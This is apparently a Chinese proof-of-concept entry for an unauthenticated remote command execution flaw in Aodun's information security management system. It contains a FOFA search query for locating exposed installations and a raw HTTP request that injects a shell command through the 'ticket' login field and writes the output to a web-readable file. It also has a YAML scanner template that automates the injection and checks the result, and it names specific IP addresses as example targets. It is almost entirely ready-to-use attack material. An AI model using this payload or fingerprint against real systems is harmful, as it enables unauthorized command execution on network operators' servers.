# 傲盾信息安全管理系统前台 sichuan_login 远程命令执行漏洞

    ## fofa

```
body="傲盾软件"||body="aodun/aodun.js"
```

## poc

http://211.161.45.230:7789/static/base_static/js/aodun/test.txt

```
POST /user_management/sichuan_login/ HTTP/1.1
Host: 211.161.45.230:7789
Content-Length: 102
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://211.161.45.230:7789
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://211.161.45.230:7789/user_management/sichuan_login/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: language=zh; isms_web=auu8o0ihreumo0bmrhuz8qa5p4pq882y
Connection: close

loginname=sysadmin&ticket=|whoami>/adm/isms_web/static/base_static/js/aodun/test.txt
```

## exp

```
detail:
  ID: 4941
  Author: 匿名作者
  Name: 傲盾信息安全管理系统前台远程命令执行漏洞
  Description: 信息安全管理系统（ISMS）是IDC/ISP业务经营者建设的具有基础数据管理、 访问日志管理、信息安全管理等功能的信息安全管理系统，该漏洞可未授权的情况下直接执行任意命令
  Identifier:
    DVB: DVB-2023-4941
  VulnClass:
  - 远程命令执行
  Category:
  - 应用服务
  Manufacturer: 傲盾
  Product: 傲盾 信息安全管理系统<=7.1.7.24
  Type: 1
  Status: 1
  Scanable: 1
  Level: 4
  DisclosureDate: '2023-08-14'
  Is0day: false
  IncludeExp: false
  Weakable: false
  IsXc: false
  IsCommon: false
  IsCallBack: false
  Condition: body="傲盾软件"||body="aodun/aodun.js"
  Solutions:
  - 访问控制，对输入过滤并修复相关代码
  Sources:
  - http://61.183.8.97:7789
poc:
  relative: req0 && req1
  session: false
  get_variables:
  - '{{randomstr}}': randomLowerCase(5)
  requests:
  - method: POST
    timeout: 10
    path: /user_management/sichuan_login
    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/89.0.3119.54 Safari/537.36
      Content-Type: application/x-www-form-urlencoded
    data: loginname=sysadmin&ticket=|echo {{randomstr}}>/adm/isms_web/static/base_static/js/aodun/test.txt
    follow_redirects: true
    matches: code.eq("200")
  - method: GET
    timeout: 10
    path: /static/base_static/js/aodun/test.txt
    headers:
      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/89.0.3119.54 Safari/537.36
    follow_redirects: true
    matches: (code.eq("200") && body.contains("{{randomstr}}"))
```
